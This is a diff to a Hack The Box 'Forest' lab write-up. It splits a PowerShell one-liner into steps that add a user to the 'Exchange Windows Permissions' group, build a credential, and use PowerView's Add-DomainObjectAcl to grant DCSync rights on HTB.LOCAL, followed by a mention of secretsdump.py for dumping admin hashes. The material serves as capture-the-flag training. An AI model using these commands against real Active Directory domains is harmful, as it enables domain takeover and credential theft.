@@ -514,17 +514,31 @@ upload /root/HTB/active/forest/PowerView.ps1 .\PowerView.ps1
 <hr width="400" size="10">
 
 
-The following one-liner is:
 
 1. a command to Add sh1n0bi to the "Exchange Windows Permissions" group
-2. set the variable $pass for use in next command
-3. set the variable $Cred for use in final command
-4. Uses the PowerView function Add-DomainObjectAcl to award sh1n0bi DCSync rights.
+```
+Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members sh1n0bi;$Username = 'htb\sh1n0bi';$Password = 'password123'
+```
 
-They can be executed individually,or as a one-liner.
+2. set the variable $pass for use in next command
+```
+$pass = ConvertTo-SecureString -AsPlainText $Password -Force
+```
+
+3. set the variable $Cred for use in final command
+$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass
+
+
+4. Uses the PowerView function Add-DomainObjectAcl to award sh1n0bi DCSync rights.
+```
+Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+```
+
+They can be executed individually,or as a one-liner. 
+Ive already added sh1n0bi to the "Exchange Windows Permissions" group so don't need that first line.
 
 ```
-Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members sh1n0bi;$Username = 'htb\sh1n0bi';$Password = 'password123'; $pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
+$pass = ConvertTo-SecureString -AsPlainText $Password -Force;$Cred = New-Object System.Management.Automation.PSCredential -ArgumentList $Username,$pass;Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'sh1n0bi' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
 ```
 
 Now we can use Impacket's `secretsdump.py` to get the Admin hashes.
